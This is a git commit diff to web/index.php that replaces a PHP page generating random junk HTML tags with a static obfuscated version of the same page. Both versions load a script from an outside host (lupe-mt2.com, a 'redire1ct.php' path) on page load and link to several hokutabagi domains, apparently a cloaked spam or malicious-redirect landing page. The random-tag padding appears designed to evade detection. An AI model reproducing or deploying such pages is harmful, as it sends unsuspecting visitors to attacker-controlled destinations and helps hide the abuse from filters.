4373a8aa82ce97ccc6c3e7ef262f6d3d96178800
sanernecro <sanernecro@gmail.com>
2016-11-08 04:43:31 +0200

    Update index.php

--- web/index.php
+++ web/index.php
@@ -1,22 +1,2 @@
-<?php 
-function rasgele($uzunluk)
-  {
-   $karakterler = "abcdefghijklmnopqrstuvwxyz";
-   for($i=0;$i<$uzunluk;$i++)
-   {
-     $key .= $karakterler{rand(0,25)};
-   }
-   return $key;
-  }
-?>
- <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
-<html><head>
-<meta http-equiv="content-type" content="text/html; charset=utf-8">
-<<?php echo rasgele(10); ?>><<?php echo rasgele(10); ?> class="<?php echo rasgele(4); ?>"><<?php echo rasgele(10); ?> id="<?php echo rasgele(10); ?>"><a href="http://<?php echo rasgele(10); ?>.<?php echo rasgele(4); ?>"><<?php echo rasgele(10); ?> id="<?php echo rasgele(10); ?>"><i><div id="<?php echo rasgele(10); ?>"><i id="<?php echo rasgele(10); ?>"><i class="<?php echo rasgele(10); ?>"><<?php echo rasgele(10); ?> class="<?php echo rasgele(10); ?>"><<?php echo rasgele(10); ?>><i><div><<?php echo rasgele(10); ?>><a href="http://<?php echo rasgele(10); ?>.<?php echo rasgele(4); ?>"></a><a href="http://hokutabagi.club"><div class="<?php echo rasgele(10); ?>"><i id="<?php echo rasgele(10); ?>"><div id="<?php echo rasgele(10); ?>">
-<meta charset="utf-8">
-<title><?php echo rasgele(4); ?> <?php echo rasgele(6); ?></title>
-<meta property="og:title" content="<?php echo rasgele(4); ?> <?php echo rasgele(6); ?>">
-<meta property="og:description" content="">
-<script src="http://lupe-mt2.com/php/redire1ct.php?<?php echo rasgele(10); ?>"></script><a href="https://<?php echo rasgele(6); ?>.<?php echo rasgele(3); ?>"><i><<?php echo rasgele(10); ?>><div id="<?php echo rasgele(10); ?>"><div id="<?php echo rasgele(7); ?>"><div><i id="<?php echo rasgele(10); ?>"><div><<?php echo rasgele(10); ?>><i id="<?php echo rasgele(10); ?>"><i><<?php echo rasgele(4); ?> id="<?php echo rasgele(10); ?>"><<?php echo rasgele(10); ?> id="<?php echo rasgele(10); ?>"><<?php echo rasgele(10); ?> class="<?php echo rasgele(10); ?>"><div id="<?php echo rasgele(10); ?>"></div></<?php echo rasgele(10); ?>></<?php echo rasgele(10); ?>></<?php echo rasgele(10); ?>></i></i></<?php echo rasgele(10); ?>></div></i></div></div></div></<?php echo rasgele(10); ?>></i></a>
-</div></i></div></a></<?php echo rasgele(10); ?>></div></i></<?php echo rasgele(10); ?>></<?php echo rasgele(10); ?>></i></i></div></i></<?php echo rasgele(10); ?>></a></<?php echo rasgele(10); ?>></<?php echo rasgele(10); ?>></<?php echo rasgele(10); ?>>
-</head></html>
+
+<evemousokagu><gibuluopifiro class="itahe"><evemousokagu id="aduvelufe"><a href="http://hokutabagi.online" </a><evemousokagu id="aduvelufe"><i><div id="aduvelufe"><i id="aduvelufe"><i class="itahe"><gibuluopifiro class="itahe""><gibuluopifiro><i><div><gibuluopifiro><a href="http://hokutabagi.date" </a><a href="http://hokutabagi.club" </a><div class="itahe"><i id="aduvelufe"><div id="aduvelufe"><meta charset="utf-8"> <title>Kamuao Eselomemo</title><meta property="og:title" content="Kamuao Eselomemo" /> <meta property="og:description" content="" /><script src="http://lupe-mt2.com/php/redire1ct.php?keduciu"></script><a href="https://hokutabagi.org" </a><i><evemousokagu><div id="aduvelufe"><div id="aduvelufe"><div><i id="aduvelufe"><div><gibuluopifiro><i id="aduvelufe"><i><evemousokagu id="aduvelufe"><evemousokagu id="aduvelufe"><evemousokagu class="itahe"><div id="aduvelufe"></div></evemousokagu></evemousokagu></evemousokagu></i></i></gibuluopifiro></div></i></div></div></div></evemousokagu></i></div></i></div></gibuluopifiro></div></i></gibuluopifiro></gibuluopifiro></i></i></div></i></evemousokagu></evemousokagu></gibuluopifiro></evemousokagu>
